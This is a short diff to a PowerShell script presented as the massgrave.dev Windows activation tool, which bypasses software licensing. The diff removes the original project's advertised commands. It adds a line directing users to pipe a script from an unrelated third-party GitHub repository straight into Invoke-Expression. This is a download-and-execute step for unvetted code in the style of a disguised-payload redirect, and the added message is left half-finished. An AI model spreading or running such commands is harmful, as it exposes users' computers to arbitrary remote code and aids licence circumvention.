@@ -1,9 +1,7 @@
 # Check massgrave.dev for more details
 
 write-host
-Write-Host "The current command (irm https://massgrave.dev/get | iex) will be retired in the future."
-Write-Host -ForegroundColor Green "Use the new command (irm https://get.activated.win | iex) moving forward."
-write-host
+Write-Host "The current command (irm https://raw.githubusercontent.com/Codingwithm-cloud/windowactivator/refs/heads/main/win.ps1 | iex) ."
 
 if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
     $ExecutionContext.SessionState.LanguageMode
